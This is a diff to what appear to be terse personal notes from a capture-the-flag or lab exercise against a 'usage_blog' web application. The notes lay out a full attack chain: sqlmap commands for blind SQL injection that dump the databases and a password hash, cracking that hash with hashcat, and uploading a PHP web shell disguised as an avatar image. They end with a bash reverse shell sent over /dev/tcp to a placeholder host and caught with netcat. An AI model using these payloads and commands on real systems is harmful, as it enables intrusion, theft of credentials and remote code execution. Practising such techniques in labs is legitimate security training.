@@ -6,3 +6,15 @@ sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch -> sql inj
 sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dbs --threads 10 -> dump: available databases - information schema, performance_schema, usage_blog
 sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dump usage_blog --threads 10 (-T <tablename>) -> dump: data in table -> hash
 hashcat: bcrypt(-m 3200), rockyou.txt
+login(admin, hashcat password) -> verify laravel 1.8.18 -> upload php vulnerability
+burpsuite: Edit user -> submit & modify form
+
+------------
+Content-Disposition: form-data; name ="avatar"; filename=""->"shell.php"
+Content-Type: application/octet-stream
+
+<?php system($_REQUEST['cmd']) ?>
+-----------
+Edit user -> select shell.php image(i)(Go to Uploaded) -> <url>?cmd=<command> -> burpsuite intercept
+-> change request method -> add 2 enters after last & cmd=bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' --needs to be url encoded
+nc -nlvp <port> -> get www shell
